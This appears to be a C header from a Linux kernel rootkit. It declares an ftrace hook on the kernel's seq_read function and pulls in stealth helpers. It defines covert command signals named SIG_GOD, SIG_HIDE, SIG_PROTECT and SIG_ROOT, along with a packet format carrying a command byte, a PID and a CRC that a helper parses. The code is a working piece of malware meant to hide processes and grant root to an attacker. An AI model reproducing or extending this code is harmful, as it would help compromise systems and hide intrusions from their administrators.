#ifndef COMMS_H
#define COMMS_H

#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/syscalls.h>
#include <linux/types.h>

#include "ftrace_helper.h"
#include "king.h"
#include "stealth_helper.h"
#include "utils.h"

/* Enum for the different command signals */
enum {
  SIG_GOD = 0xFF,
  SIG_HIDE = 0xFA,
  SIG_PROTECT = 0xFB,
  SIG_ROOT = 0xBA,
};

enum {
  /* Component sizes */
  CMD_SIZE = sizeof(char),
  RAND_BYTES_SIZE = 4 * sizeof(char),
  PID_SIZE = sizeof(pid_t),
  CRC_SIZE = sizeof(uint32_t),

  TOTAL_SIZE = CMD_SIZE + RAND_BYTES_SIZE + PID_SIZE + CRC_SIZE,

  /* Offsets */
  PID_OFFSET = TOTAL_SIZE - (PID_SIZE + CRC_SIZE),
  CRC_OFFSET = TOTAL_SIZE - CRC_SIZE
};

/* Extract the signal, pid and CRC from the given buffer */
static inline void extract_components(char *buf, uint8_t *sig, pid_t *pid, uint32_t *crc) {
  *sig = (uint8_t)buf[0]; // first byte (command)
  memcpy(pid, buf + PID_OFFSET, PID_SIZE);
  memcpy(crc, buf + CRC_OFFSET, CRC_SIZE);
}

void sig_handle(const uint32_t sig, pid_t pid);

extern asmlinkage ssize_t (*orig_seq_read)(struct file *file, char __user *buf,
                                           size_t size, loff_t *ppos);
asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf,
                                 size_t size, loff_t *ppos);

#endif // COMMS_H